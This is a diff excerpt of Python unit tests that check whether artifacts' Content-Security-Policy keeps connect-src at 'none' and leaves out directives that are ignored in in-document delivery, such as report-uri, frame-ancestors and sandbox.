+        self.write_artifact(policy=FIXTURE_POLICY.replace("connect-src 'none'", "connect-src 'self'"))
+
+        self.assertReports(check_j9(self.gallery), FIXTURE_ARTIFACT_LABEL, "'self'")
+
+    def test_j9_rejects_a_host_valued_directive(self) -> None:
+        self.write_artifact(
+            policy=FIXTURE_POLICY.replace("connect-src 'none'", f"connect-src https://{FIXTURE_FOREIGN_HOST}")
+        )
+
+        self.assertReports(check_j9(self.gallery), FIXTURE_ARTIFACT_LABEL, "connect-src")
+
+    # -- J10: directives stripped from in-document delivery --
+
+    def test_j10_rejects_a_directive_stripped_from_in_document_delivery(self) -> None:
+        for directive in ("report-uri /r", "report-to endpoint", "frame-ancestors 'none'", "sandbox"):
+            with self.subTest(msg=directive):
+                self.setUp()
+                self.write_artifact(policy=f"{FIXTURE_POLICY}; {directive}")
+
+                self.assertReports(check_j10(self.gallery), FIXTURE_ARTIFACT_LABEL, directive.split()[0])
+
+
 class CheckSignatureTests(unittest.TestCase):
     """Enforce the rule the rest of this module depends on.
 
@@ -3012,6 +4698,10 @@ CHECK_GROUPS: tuple[type[unittest.TestCase], ...] = (
     TriggerClosureFixtureTests,
     ArtifactExistenceTests,
     ArtifactExistenceFixtureTests,
+    ExternalReferenceTests,
+    ExternalReferenceFixtureTests,
+    ProhibitedConstructTests,
+    ProhibitedConstructFixtureTests,
 )
 
 
